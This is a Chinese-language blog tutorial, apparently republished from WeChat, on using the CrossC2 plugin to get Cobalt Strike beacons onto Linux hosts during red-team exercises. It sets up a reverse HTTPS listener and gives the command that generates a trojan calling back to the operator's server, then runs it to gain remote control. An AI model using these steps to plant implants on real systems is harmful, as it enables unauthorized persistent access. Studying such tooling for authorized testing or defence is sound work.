> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247484704&idx=1&sn=38562af1170eb9b5fb6c437412714b40&chksm=eaad851dddda0c0b4c112860e64e14c4503b875fc3e975679d6f6fb863f97b00c72d44d4c2bd&scene=21#wechat_redirect)

CobaltStrike 上线 Linux 主机 (CrossC2)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtGbgPCosWPKia9KXLfMCM4lzYm0iceB0XL71zBXOeXVHN7zzIedR9lWQA/640?wx_fmt=png)

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtW9KibKFYM7gZyhDuvOxoF9uicsG9Srwdq0icu0ic8uib5TQW82eCbCwJibSg/640?wx_fmt=png)

写在前面  

在红蓝对抗中，我们经常会碰到需要对 Linux 主机进行长期远控的情况。对于 Windows 主机，我们可以使用 CobaltStrike，那么自然我们会想问，CobaltStrike 能否对 Linux 主机进行长期远控呢？

在上一篇文章中我提到了，CobaltStrike 自身上线 Linux 主机的情况，需要知道对方 Linux 主机的账号密码或 SSH 秘钥，并且还需要获取一台其他机器权限作为中继。传送门：CobaltStrike SSH 远程登录   

本文中将讲解如何通过在 Linux 上执行木马反弹一个 CobaltStrike 类型的 shell，这得依赖于一个 CobaltStrike 的插件 CrossC2。

CrossC2 插件项目地址：https://github.com/gloxec/CrossC2

注：CrossC2 项目官方声明只支持 CobaltStrike3.14 版本，本人亲测 CobaltStrike4.0 也可正常上线，但是无法执行其他操作。

  

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtJYUJmkshXBOhU0MhC9Nxh4qRDqt1VhpP58u9J3JZfCLdGudPVUql3A/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtJp6sGUhpEiaW5sghvDE5E0Qw1MoHwuqic65pB202icibKXES442yX9R40w/640?wx_fmt=gif)

1：首先，访问 CrossC2 项目地址，下载该项目。

将项目 src 目录下 genCrossC2.Linux 文件上传到 CobaltStrike 服务端目录下。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtxEdY9vrPIOmJRZnLrC65ZFEXsGV8GajxxibIngPicgKt7Jsic40D8qEpQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtH1w7NoYdcmRSichtvrHoV7rghFXHcwc36zdAbIqtnTYpKkzFDBoMiaFw/640?wx_fmt=png)

2：将 CobaltStrike 服务端的. cobaltstrike.beacon_keys 下载到 CobaltStrike 客户端目录下。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtZtia7j3YGX6rbOS4XF9viahLD4nbU1B0J04z3eaJ5dMaiatcCmd7B4OZw/640?wx_fmt=png)  
3：由于 Cross C2 目前只支持 HTTPS Beacon，所以在 Listenrs 中选择 HTTPS 进行监听，

服务端开启监听 windows/beacon_https/reverse_https 类型的 beacon

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtNrrsmzoLKjbDe2ntPo9m88oL60ibStUqibfdRvW4KAPclsTKTASRXYAg/640?wx_fmt=png)

4：生成木马

```
./genCrossC2.Linux 监听的IP 监听的端口 null null Linux x64 test
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtuYHUyok5tAybKgFPuGpG7nnE6axkb6Vxc8TldpM6qTJGyQic9ket5lg/640?wx_fmt=png)

5：执行木马上线

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtcibIXlsLQVEODBFkvIf8ELZAHzIF7mE3p1jibUsHibo5DYNAf0kUoUvyA/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtibOSJHdlibBbrwYsbbiaicPuI3DESVtkibDRCwciaDtWmGniagn7Yiah8USNNA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtPw47H9Ziau20R57v6cSw3sJvXcVkQC6edXrtnpic4gZaOERt8OdTgiaDg/640?wx_fmt=png)

责编：vivian

来源：谢公子博客

![](https://mmbiz.qpic.cn/mmbiz_jpg/rSyd2cclv2cKS5gSiauhQU8z0nyWqL939CibFP9r2thgvWjGJJYuwiczib0MicHXY5nQ3wdNVdG631Oq9yLOOVjnogQ/640?wx_fmt=jpeg)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEtvC866LcTfndP2axurhEiakWDAePcIoZlxGlksrULjq2RKEQ16FzOnZA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEt3mZ0WohIhKXT7X9ewrSurKzdK64DXn9qxiaspahiafk3K2rfBVibLiaM0w/640?wx_fmt=png)

如果文中有错误的地方，欢迎指出。有想转载的，可以留言我加白名单。  
最后，欢迎加入谢公子的小黑屋（安全交流群）(QQ 群：783820465)

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2dwNAqDyiaJAEEm1eSRoZwEt41EgaJiczmWyobwdQ8PJJbjk9qzATkYM1ynsufbUybTSqLniag9do31Q/640?wx_fmt=png)